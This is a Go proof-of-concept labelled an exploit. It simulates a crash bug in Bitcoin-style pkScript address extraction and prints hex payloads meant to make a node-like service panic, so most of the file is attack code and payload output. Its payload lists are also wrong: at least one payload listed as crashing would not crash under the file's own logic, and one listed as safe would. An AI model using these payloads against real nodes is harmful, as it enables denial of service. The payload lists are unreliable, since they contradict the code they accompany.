package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"os"
)

// ExtractPkScriptAddrs returns inconsistent state: it says there's 1 address (numAddrs=1) 
// but provides 0 addresses (len(addrs)=0). The calling code trusts numAddrs and 
// doesn't verify len(addrs)

// simulateExtractPkScriptAddrs simulates the vulnerable function behavior
func simulateExtractPkScriptAddrs(pkScript []byte) (numAddrs int, addrsLen int, wouldPanic bool) {
	// Simulate extractPubKey check
	if len(pkScript) < 2 || pkScript[len(pkScript)-1] != 0xac {
		return 0, 0, false
	}
	
	// Check if it's a pubkey script pattern
	dataLen := int(pkScript[0])
	if len(pkScript) != dataLen+2 {
		return 0, 0, false
	}
	
	// Extract the public key data
	pubKeyData := pkScript[1 : len(pkScript)-1]
	
	// Simulate btcutil.NewAddressPubKey validation
	validKey := isValidPubKey(pubKeyData)
	
	// This is the vulnerable behavior:
	// numAddrs is always 1 for pubkey scripts, but addrs might be empty
	numAddrs = 1
	if validKey {
		addrsLen = 1
	} else {
		addrsLen = 0 // Empty slice but numAddrs still 1!
	}
	
	// The vulnerable code does: addrs[0].EncodeAddress()
	// This panics when addrsLen == 0 but numAddrs == 1
	wouldPanic = (numAddrs == 1 && addrsLen == 0)
	
	return numAddrs, addrsLen, wouldPanic
}

// isValidPubKey performs basic public key validation
func isValidPubKey(data []byte) bool {
	if len(data) == 33 {
		// Compressed key: must start with 0x02 or 0x03
		return data[0] == 0x02 || data[0] == 0x03
	} else if len(data) == 65 {
		// Uncompressed key: must start with 0x04
		return data[0] == 0x04
	}
	return false
}

// exploitTarget simulates the vulnerable code pattern
func exploitTarget(pkScript []byte) (crashed bool, errorMsg string) {
	defer func() {
		if r := recover(); r != nil {
			crashed = true
			errorMsg = fmt.Sprintf("PANIC: %v", r)
		}
	}()
	
	numAddrs, addrsLen, _ := simulateExtractPkScriptAddrs(pkScript)
	
	// Simulate the vulnerable check
	if numAddrs != 1 {
		return false, fmt.Sprintf("invalid number (%d) of addresses", numAddrs)
	}
	
	// Simulate the vulnerable array access - this will panic if addrsLen == 0
	if addrsLen == 0 {
		// This simulates: inputAddr := addrs[0].EncodeAddress()
		panic("runtime error: index out of range [0] with length 0")
	}
	
	return false, "success - no crash"
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Invalid Public Key Panic Exploit")
		fmt.Println("Usage: ./exploit <hex_encoded_pkscript>")
		fmt.Println()
		fmt.Println("Payloads that cause panic:")
		fmt.Println("  3f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ac")
		fmt.Println("  00ac")
		fmt.Println("  2205ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
		fmt.Println("  4105ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
		fmt.Println()
		fmt.Println("Payloads that do not crash:")
		fmt.Println("  20000000000000000000000000000000000000000000000000000000000000000000ac")
		fmt.Println("  2102ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffac")
		os.Exit(1)
	}
	
	hexInput := os.Args[1]
	
	// Decode hex input
	pkScript, err := hex.DecodeString(hexInput)
	if err != nil {
		log.Fatalf("Invalid hex input: %v", err)
	}
	
	fmt.Printf("Testing pkScript: %s\n", hex.EncodeToString(pkScript))
	
	// Test the payload
	crashed, errorMsg := exploitTarget(pkScript)
	
	if crashed {
		fmt.Printf("Result: EXPLOIT SUCCESSFUL - Service crashed!\n")
		fmt.Printf("Error: %s\n", errorMsg)
		os.Exit(2) // Exit code 2 indicates successful exploit
	} else {
		fmt.Printf("Result: No crash - %s\n", errorMsg)
		os.Exit(0)
	}
}